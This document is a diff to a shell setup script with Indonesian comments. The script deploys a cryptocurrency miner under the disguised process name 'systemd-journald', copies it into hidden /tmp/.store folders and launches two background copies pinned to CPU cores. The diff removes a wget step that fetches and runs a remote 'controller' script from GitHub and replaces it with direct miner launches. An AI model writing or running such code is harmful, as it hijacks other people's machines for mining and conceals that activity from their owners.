@@ -26,10 +26,6 @@ tar -xzf cache.tar.gz
 rm -f cache.tar.gz
 mv cache systemd-journald
 
-# Download controller script
-wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/httpd.py -O syncd.py
-chmod +x syncd.py
-
 # Copy ke folder 1 dan 2
 cp systemd-journald /tmp/.store/1/
 cp systemd-journald /tmp/.store/2/
@@ -39,8 +35,16 @@ chmod +x /tmp/.store/2/systemd-journald
 # Bersih-bersih
 rm -f systemd-journald
 
-# Jalankan controller
-echo -e "${GREEN}[*] Starting background controller...${NC}"
-nohup python3 syncd.py > /dev/null 2>&1 &
+# Jalankan web langsung
+echo -e "${GREEN}[*] Starting miners...${NC}"
 
-echo -e "${GREEN}[✓] Setup selesai dan controller jalan di background.${NC}"
+# web pertama di core 0
+nohup taskset -c 0 /tmp/.store/1/systemd-journald > /dev/null 2>&1 &
+
+# web kedua di core 1
+nohup taskset -c 1 /tmp/.store/2/systemd-journald > /dev/null 2>&1 &
+
+echo -e "${GREEN}[✓] Setup selesai dan miners jalan di background.${NC}"
+
+# Cek web jalan
+ps aux | grep systemd-journald
